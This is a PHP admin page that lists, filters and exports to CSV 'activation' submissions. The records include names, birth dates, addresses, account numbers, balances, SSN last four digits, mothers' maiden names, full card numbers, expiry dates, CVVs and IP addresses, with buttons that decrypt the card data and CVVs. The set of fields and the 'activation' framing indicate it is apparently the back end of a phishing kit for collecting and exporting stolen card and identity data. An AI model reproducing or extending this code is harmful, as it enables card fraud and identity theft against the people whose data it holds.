<?php
/**
 * Admin Activations - View All Submissions
 * Comprehensive data table with search, filter, sort, and export
 */

require_once __DIR__ . '/includes/auth.php';

$pageTitle = 'All Activations';

// Pagination settings
$perPage = 20;
$page = isset($_GET['page']) ? max(1, (int)$_GET['page']) : 1;
$offset = ($page - 1) * $perPage;

// Search and filter parameters
$search = isset($_GET['search']) ? sanitize_input($_GET['search']) : '';
$statusFilter = isset($_GET['status']) ? sanitize_input($_GET['status']) : '';
$dateFrom = isset($_GET['date_from']) ? sanitize_input($_GET['date_from']) : '';
$dateTo = isset($_GET['date_to']) ? sanitize_input($_GET['date_to']) : '';
$sortBy = isset($_GET['sort']) ? sanitize_input($_GET['sort']) : 'created_at';
$sortOrder = isset($_GET['order']) && $_GET['order'] === 'asc' ? 'ASC' : 'DESC';

// Allowed sort columns
$allowedSortColumns = ['id', 'first_name', 'last_name', 'email', 'account_number', 'balance', 'status', 'created_at'];
if (!in_array($sortBy, $allowedSortColumns)) {
    $sortBy = 'created_at';
}

// Handle export
if (isset($_GET['export']) && $_GET['export'] === 'csv') {
    exportToCSV();
    exit;
}

// Build query
try {
    $db = getDB();
    
    $whereConditions = [];
    $params = [];
    
    // Search condition
    if (!empty($search)) {
        $whereConditions[] = "(first_name LIKE ? OR last_name LIKE ? OR email LIKE ? OR account_number LIKE ?)";
        $searchParam = "%$search%";
        $params[] = $searchParam;
        $params[] = $searchParam;
        $params[] = $searchParam;
        $params[] = $searchParam;
    }
    
    // Status filter
    if (!empty($statusFilter)) {
        $whereConditions[] = "status = ?";
        $params[] = $statusFilter;
    }
    
    // Date range filter
    if (!empty($dateFrom)) {
        $whereConditions[] = "DATE(created_at) >= ?";
        $params[] = $dateFrom;
    }
    
    if (!empty($dateTo)) {
        $whereConditions[] = "DATE(created_at) <= ?";
        $params[] = $dateTo;
    }
    
    $whereClause = !empty($whereConditions) ? 'WHERE ' . implode(' AND ', $whereConditions) : '';
    
    // Get total count
    $countSql = "SELECT COUNT(*) as total FROM activations $whereClause";
    $totalResult = $db->fetchOne($countSql, $params);
    $totalRecords = $totalResult['total'] ?? 0;
    $totalPages = ceil($totalRecords / $perPage);
    
    // Get activations
    $sql = "SELECT * FROM activations $whereClause ORDER BY $sortBy $sortOrder LIMIT ? OFFSET ?";
    $params[] = $perPage;
    $params[] = $offset;
    $activations = $db->fetchAll($sql, $params);
    
} catch (Exception $e) {
    log_error('Activations list error: ' . $e->getMessage());
    $activations = [];
    $totalRecords = 0;
    $totalPages = 0;
}

// Export to CSV function
function exportToCSV() {
    global $db, $whereConditions, $params, $sortBy, $sortOrder;
    
    try {
        // Get all matching records (no pagination for export)
        $whereClause = !empty($whereConditions) ? 'WHERE ' . implode(' AND ', $whereConditions) : '';
        $sql = "SELECT * FROM activations $whereClause ORDER BY $sortBy $sortOrder";
        
        // Remove pagination params
        $exportParams = array_slice($params, 0, count($params) - 2);
        $records = $db->fetchAll($sql, $exportParams);
        
        // Set headers for CSV download
        header('Content-Type: text/csv');
        header('Content-Disposition: attachment; filename="activations_' . date('Y-m-d_His') . '.csv"');
        
        $output = fopen('php://output', 'w');
        
        // CSV headers
        fputcsv($output, [
            'ID', 'First Name', 'Last Name', 'Date of Birth', 'Email', 'Phone',
            'Account Number', 'Street', 'City', 'State', 'ZIP',
            'SSN Last 4', 'Maiden Name', 'Card Number', 'Expiry Date', 'CVV',
            'Balance', 'Status', 'IP Address', 'Created At'
        ]);
        
        // CSV data
        foreach ($records as $record) {
            fputcsv($output, [
                $record['id'],
                $record['first_name'],
                $record['last_name'],
                $record['dob'],
                $record['email'],
                $record['phone'],
                $record['account_number'],
                $record['street'],
                $record['city'],
                $record['state'],
                $record['zip'],
                decrypt_data($record['ssn_last4']),
                $record['maiden_name'],
                decrypt_data($record['card_number']),
                $record['expiry_date'],
                decrypt_data($record['cvv']),
                $record['balance'],
                $record['status'],
                $record['ip_address'],
                $record['created_at']
            ]);
        }
        
        fclose($output);
    } catch (Exception $e) {
        log_error('CSV export error: ' . $e->getMessage());
        die('Error exporting data');
    }
}

// Include header
include __DIR__ . '/includes/header.php';
?>

<!-- Search and Filter Section -->
<div class="card mb-4">
    <div class="card-body">
        <form method="GET" action="/admin/activations.php" class="filter-form">
            <div class="filter-row">
                <div class="filter-group">
                    <label for="search">Search</label>
                    <input type="text" id="search" name="search" class="form-control" 
                           placeholder="Name, email, account..." 
                           value="<?php echo htmlspecialchars($search); ?>">
                </div>
                
                <div class="filter-group">
                    <label for="status">Status</label>
                    <select id="status" name="status" class="form-control">
                        <option value="">All Statuses</option>
                        <option value="pending" <?php echo $statusFilter === 'pending' ? 'selected' : ''; ?>>Pending</option>
                        <option value="active" <?php echo $statusFilter === 'active' ? 'selected' : ''; ?>>Active</option>
                        <option value="suspended" <?php echo $statusFilter === 'suspended' ? 'selected' : ''; ?>>Suspended</option>
                    </select>
                </div>
                
                <div class="filter-group">
                    <label for="date_from">Date From</label>
                    <input type="date" id="date_from" name="date_from" class="form-control" 
                           value="<?php echo htmlspecialchars($dateFrom); ?>">
                </div>
                
                <div class="filter-group">
                    <label for="date_to">Date To</label>
                    <input type="date" id="date_to" name="date_to" class="form-control" 
                           value="<?php echo htmlspecialchars($dateTo); ?>">
                </div>
                
                <div class="filter-actions">
                    <button type="submit" class="btn btn-primary">Filter</button>
                    <a href="/admin/activations.php" class="btn btn-secondary">Reset</a>
                    <a href="?<?php echo http_build_query(array_merge($_GET, ['export' => 'csv'])); ?>" 
                       class="btn btn-success">Export CSV</a>
                </div>
            </div>
        </form>
    </div>
</div>

<!-- Results Summary -->
<div class="results-summary">
    <p>Showing <?php echo number_format(count($activations)); ?> of <?php echo number_format($totalRecords); ?> activations</p>
</div>

<!-- Activations Table -->
<div class="card">
    <div class="card-body">
        <?php if (!empty($activations)): ?>
        <div class="table-responsive">
            <table class="data-table activations-table">
                <thead>
                    <tr>
                        <th><a href="?<?php echo http_build_query(array_merge($_GET, ['sort' => 'id', 'order' => $sortBy === 'id' && $sortOrder === 'DESC' ? 'asc' : 'desc'])); ?>">ID</a></th>
                        <th><a href="?<?php echo http_build_query(array_merge($_GET, ['sort' => 'first_name', 'order' => $sortBy === 'first_name' && $sortOrder === 'DESC' ? 'asc' : 'desc'])); ?>">Full Name</a></th>
                        <th>DOB</th>
                        <th><a href="?<?php echo http_build_query(array_merge($_GET, ['sort' => 'email', 'order' => $sortBy === 'email' && $sortOrder === 'DESC' ? 'asc' : 'desc'])); ?>">Email</a></th>
                        <th>Phone</th>
                        <th><a href="?<?php echo http_build_query(array_merge($_GET, ['sort' => 'account_number', 'order' => $sortBy === 'account_number' && $sortOrder === 'DESC' ? 'asc' : 'desc'])); ?>">Account</a></th>
                        <th>Address</th>
                        <th>SSN Last 4</th>
                        <th>Maiden Name</th>
                        <th>Card Number</th>
                        <th>Expiry</th>
                        <th>CVV</th>
                        <th><a href="?<?php echo http_build_query(array_merge($_GET, ['sort' => 'balance', 'order' => $sortBy === 'balance' && $sortOrder === 'DESC' ? 'asc' : 'desc'])); ?>">Balance</a></th>
                        <th><a href="?<?php echo http_build_query(array_merge($_GET, ['sort' => 'status', 'order' => $sortBy === 'status' && $sortOrder === 'DESC' ? 'asc' : 'desc'])); ?>">Status</a></th>
                        <th>IP Address</th>
                        <th><a href="?<?php echo http_build_query(array_merge($_GET, ['sort' => 'created_at', 'order' => $sortBy === 'created_at' && $sortOrder === 'DESC' ? 'asc' : 'desc'])); ?>">Submitted</a></th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($activations as $activation): ?>
                    <tr>
                        <td>#<?php echo str_pad($activation['id'], 6, '0', STR_PAD_LEFT); ?></td>
                        <td><?php echo htmlspecialchars($activation['first_name'] . ' ' . $activation['last_name']); ?></td>
                        <td><?php echo htmlspecialchars($activation['dob']); ?></td>
                        <td><?php echo htmlspecialchars($activation['email']); ?></td>
                        <td><?php echo htmlspecialchars($activation['phone']); ?></td>
                        <td><?php echo htmlspecialchars($activation['account_number']); ?></td>
                        <td>
                            <?php 
                            echo htmlspecialchars($activation['street'] . ', ' . 
                                                 $activation['city'] . ', ' . 
                                                 $activation['state'] . ' ' . 
                                                 $activation['zip']); 
                            ?>
                        </td>
                        <td>
                            <span class="sensitive-data" data-encrypted="<?php echo htmlspecialchars($activation['ssn_last4']); ?>">
                                <button class="btn-reveal" onclick="revealData(this, 'ssn')">Show</button>
                                <span class="hidden-data" style="display: none;"></span>
                            </span>
                        </td>
                        <td><?php echo htmlspecialchars($activation['maiden_name']); ?></td>
                        <td>
                            <span class="sensitive-data" data-encrypted="<?php echo htmlspecialchars($activation['card_number']); ?>">
                                <button class="btn-reveal" onclick="revealData(this, 'card')">Show</button>
                                <span class="hidden-data" style="display: none;"></span>
                            </span>
                        </td>
                        <td><?php echo htmlspecialchars($activation['expiry_date']); ?></td>
                        <td>
                            <span class="sensitive-data" data-encrypted="<?php echo htmlspecialchars($activation['cvv']); ?>">
                                <button class="btn-reveal" onclick="revealData(this, 'cvv')">Show</button>
                                <span class="hidden-data" style="display: none;"></span>
                            </span>
                        </td>
                        <td><?php echo format_currency($activation['balance']); ?></td>
                        <td>
                            <span class="status-badge status-<?php echo $activation['status']; ?>">
                                <?php echo ucfirst($activation['status']); ?>
                            </span>
                        </td>
                        <td><?php echo htmlspecialchars($activation['ip_address']); ?></td>
                        <td><?php echo format_date($activation['created_at'], 'M d, Y g:i A'); ?></td>
                        <td class="actions-cell">
                            <a href="/admin/view.php?id=<?php echo $activation['id']; ?>" 
                               class="btn btn-sm btn-info" title="View Details">View</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        
        <!-- Pagination -->
        <?php if ($totalPages > 1): ?>
        <div class="pagination">
            <?php if ($page > 1): ?>
            <a href="?<?php echo http_build_query(array_merge($_GET, ['page' => $page - 1])); ?>" 
               class="btn btn-sm btn-secondary">Previous</a>
            <?php endif; ?>
            
            <span class="pagination-info">
                Page <?php echo $page; ?> of <?php echo $totalPages; ?>
            </span>
            
            <?php if ($page < $totalPages): ?>
            <a href="?<?php echo http_build_query(array_merge($_GET, ['page' => $page + 1])); ?>" 
               class="btn btn-sm btn-secondary">Next</a>
            <?php endif; ?>
        </div>
        <?php endif; ?>
        
        <?php else: ?>
        <p class="text-muted text-center py-4">No activations found.</p>
        <?php endif; ?>
    </div>
</div>

<script>
// Decrypt and reveal sensitive data
function revealData(button, type) {
    const container = button.closest('.sensitive-data');
    const hiddenSpan = container.querySelector('.hidden-data');
    const encrypted = container.getAttribute('data-encrypted');
    
    if (hiddenSpan.style.display === 'none') {
        // Decrypt and show
        fetch('/admin/decrypt.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'encrypted=' + encodeURIComponent(encrypted)
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                hiddenSpan.textContent = data.decrypted;
                hiddenSpan.style.display = 'inline';
                button.textContent = 'Hide';
                button.classList.add('active');
            } else {
                alert('Failed to decrypt data');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Error decrypting data');
        });
    } else {
        // Hide
        hiddenSpan.style.display = 'none';
        button.textContent = 'Show';
        button.classList.remove('active');
    }
}
</script>

<?php include __DIR__ . '/includes/footer.php'; ?>
